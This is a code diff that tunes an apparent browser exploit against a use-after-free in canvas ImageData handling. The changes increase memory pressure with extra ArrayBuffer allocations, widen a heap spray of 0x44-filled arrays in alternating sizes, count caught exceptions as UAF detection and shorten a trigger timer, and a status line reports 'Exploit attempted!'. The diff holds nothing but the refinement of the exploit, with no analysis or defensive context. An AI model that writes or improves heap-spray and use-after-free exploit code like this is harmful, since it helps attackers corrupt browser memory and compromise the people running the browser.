@@ -37,12 +37,18 @@
             for (let i = 0; i < 500; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
+            // Additional stress
+            const extraBuffers = [];
+            for (let i = 0; i < 100; i++) {
+                extraBuffers.push(new ArrayBuffer(2 * 1024 * 1024));
+            }
         }
 
         function sprayHeap() {
             const arrays = [];
-            for (let i = 0; i < 12000; i++) {
-                const buf = new Uint8Array(4096);
+            for (let i = 0; i < 15000; i++) {
+                const size = i % 2 === 0 ? 4096 : 8192; // Vary sizes
+                const buf = new Uint8Array(size);
                 buf.fill(0x44);
                 arrays.push(buf);
             }
@@ -66,11 +72,15 @@
         function checkImageDataUAF(imageData) {
             const original = new Uint8Array(imageData.data);
             ctx.putImageData(imageData, 0, 0);
-            const current = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-            for (let i = 0; i < original.length; i++) {
-                if (original[i] !== current[i]) {
-                    return true; // UAF detected
+            try {
+                const current = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                for (let i = 0; i < original.length; i++) {
+                    if (original[i] !== current[i]) {
+                        return true; // UAF detected
+                    }
                 }
+            } catch (e) {
+                return true; // Exception indicates UAF
             }
             return false;
         }
@@ -121,7 +131,7 @@
 
                     status.textContent = 'Exploit attempted!';
                     clearInterval(drawInterval);
-                }, 200);
+                }, 150);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = `Failed: ${err.message}`;
